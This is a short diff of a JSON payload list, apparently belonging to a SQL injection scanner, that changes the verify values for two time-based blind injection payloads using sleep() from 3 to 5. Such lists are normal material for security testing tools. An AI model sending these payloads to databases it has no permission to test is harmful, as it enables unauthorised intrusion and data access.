@@ -5,14 +5,14 @@
         {
             "payload": "' OR sleep(3) OR 'a'='",
             "verify": [
-                3
+                5
             ],
             "type": "time"
         },
         {
             "payload": "' AND sleep(0.2) OR 'a'='",
             "verify": [
-                3
+                5
             ],
             "type": "time"
         }
